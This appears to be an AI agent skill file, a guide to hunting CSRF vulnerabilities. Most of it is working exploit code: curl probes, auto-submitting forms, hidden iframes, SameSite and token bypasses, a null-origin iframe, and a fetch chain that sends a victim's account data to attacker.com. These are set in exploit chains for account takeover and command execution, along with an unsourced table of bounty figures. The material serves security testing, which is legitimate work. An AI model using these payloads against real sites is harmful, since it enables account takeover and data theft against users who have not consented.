---
name: hunt-csrf
description: CSRF — state-changing actions without CSRF tokens, SameSite bypass, subdomain CSRF, double-submit cookie, token prediction. Chains to ATO, RCE, privilege escalation.
---

# CSRF HUNTING — Advanced Guide

**Core:** Attacker triggers state-changing actions as authenticated user via cross-origin requests.

## DETECTION METHODOLOGY

```bash
# Find endpoints without CSRF token
curl -s "https://target.com/settings" | grep -iE "csrf|token|nonce|_token"

# Remove token and test
curl -X POST "https://target.com/api/change-email" -d "email=evil@test.com"
# If succeeds → CSRF confirmed

# Check cookie attributes
curl -sI "https://target.com/api/change-email" | grep -i "set-cookie"
```

## CSRF TOKEN BYPASS

### Bypass 1: Token Copy from GET to POST
```
GET /api/change-email → returns CSRF token
POST /api/change-email with same token → succeeds
```

### Bypass 2: Double-Submit Cookie
```html
<img src="https://target.com/csrf-token" onerror="
  fetch('/api/change-email', {method:'POST',credentials:'include',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:'email=evil@test.com&csrf=ATTACKER_COOKIE'})">
```

### Bypass 3: Subdomain Token Leak
```
1. Find XSS on any subdomain (blog.target.com)
2. Read CSRF token from cookie/localStorage
3. Use token to trigger CSRF on parent domain
```

## SameSite BYPASS

### Top-Level Navigation
```html
<script>window.open('https://target.com/api/change-email?email=evil@test.com');</script>
```

### Subdomain Trick
```html
<script src="https://evil.subdomain.target.com/xss.js"></script>
```

### Skewer Attack
```html
<iframe name="f" style="display:none"></iframe>
<form action="https://target.com/api/change-email" method="POST" target="f">
  <input name="email" value="evil@test.com">
</form>
<script>window.open('https://target.com/'); document.forms[0].submit();</script>
```

## EXPLOIT CHAINS — REAL BOUNTY SCENARIOS

### Chain 1: CSRF → Email Change → ATO ($5K-$15K)
```
1. Find /api/change-email (no CSRF token)
2. Change victim's email to attacker@email.com
3. Trigger password reset → full ATO
```

### Chain 2: CSRF → Password Reset → ATO ($10K-$25K)
```
1. Find /api/change-password (no CSRF token)
2. Change password directly → login with new credentials
```

### Chain 3: CSRF → Admin Action → RCE ($20K-$50K)
```
1. Find /admin/api/run-command (no CSRF token)
2. Admin triggers command execution → full server compromise
```

### Chain 4: CSRF + Open Redirect → OAuth Theft ($15K-$30K)
```
1. CSRF on /oauth/authorize + open redirect
2. Victim authorizes attacker's app → code leaked → full access
```

## HTML/JS EXPLOITS

### Auto-Submit Form
```html
<body onload="document.getElementById('f').submit()">
<form id="f" action="https://target.com/api/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@email.com">
</form></body>
```

### Fetch API CSRF
```javascript
fetch('/api/change-email',{method:'POST',credentials:'include',
  headers:{'Content-Type':'application/json'},
  body:JSON.stringify({email:'attacker@email.com'})});
```

### Hidden Iframe
```html
<iframe name="f" style="display:none"></iframe>
<form action="https://target.com/api/change-email" method="POST" target="f">
  <input type="hidden" name="email" value="attacker@email.com">
</form><script>document.forms[0].submit();</script>
```

### JSONP CSRF
```html
<script>function cb(d){/* trigger action */}</script>
<script src="https://target.com/api/change-email?callback=cb&email=evil@test.com"></script>
```

## CORS + CSRF COMBO

### Data Theft via CORS
```javascript
fetch('https://target.com/api/user',{credentials:'include'})
  .then(r=>r.json())
  .then(d=>fetch('https://attacker.com/steal?data='+JSON.stringify(d)));
```

### Token Extraction + CSRF
```javascript
fetch('https://target.com/settings',{credentials:'include'})
  .then(r=>r.text())
  .then(html=>{
    const t=html.match(/csrf.*?value="(.*?)"/)[1];
    fetch('/api/change-email',{method:'POST',credentials:'include',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({email:'attacker@email.com',csrf_token:t})});
  });
```

### Null Origin Bypass
```html
<iframe sandbox="allow-scripts allow-forms"
  src="data:text/html,<script>fetch('https://target.com/api/x',{credentials:'include'}).then(r=>r.text()).then(d=>parent.postMessage(d,'*'))</script>">
</iframe>
```

## HACKERONE CSRF BOUNTIES

| Report | Endpoint | Impact | Bounty |
|--------|----------|--------|--------|
| Email Change | /api/user/email | ATO via password reset | $7,500 |
| Password Reset | /api/user/password/reset | Account enumeration | $5,000 |
| Admin Panel | /admin/api/exec | Command execution | $25,000 |
| OAuth Auth | /oauth/authorize | Force attacker app | $15,000 |
| Webhook | /api/webhooks | Data exfiltration | $8,000 |

## TESTING CHECKLIST

- [ ] Identify all state-changing endpoints (POST, PUT, DELETE, PATCH)
- [ ] Test token removal, empty token, wrong token, cross-session token
- [ ] Check SameSite cookie attributes
- [ ] Test SameSite=Lax bypass via top-level GET navigation
- [ ] Test subdomain CSRF via XSS on any subdomain
- [ ] Check CORS configuration (Allow-Origin, Allow-Credentials)
- [ ] Test JSONP endpoints that accept callbacks
- [ ] Test OAuth flow for CSRF on authorization endpoint
- [ ] Test webhook/invitation endpoints for CSRF
- [ ] Chain CSRF with open redirect for OAuth code theft
- [ ] Check admin endpoints for CSRF protection
